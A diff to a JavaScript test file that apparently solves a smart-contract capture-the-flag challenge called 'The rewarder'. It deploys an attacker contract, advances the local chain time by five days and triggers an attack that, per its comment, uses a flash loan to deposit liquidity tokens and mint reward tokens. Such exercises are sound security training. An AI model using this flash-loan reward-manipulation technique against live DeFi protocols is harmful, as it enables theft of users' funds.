@@ -65,7 +65,23 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * vulnerability: flash loan can be used to deposit liquidityToken and mint rewardToken
+         * */
+
+        const RewarderChallenge = await ethers.getContractFactory("RewarderChallenge", attacker);
+        const rc = await RewarderChallenge.deploy(
+            this.flashLoanPool.address, 
+            this.rewarderPool.address, 
+            this.liquidityToken.address, 
+            this.rewardToken.address
+        );
+        await rc.deployed();
+
+        // attacking after 5 days have passed since previous round
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        rc.attack();
     });
 
     after(async function () {
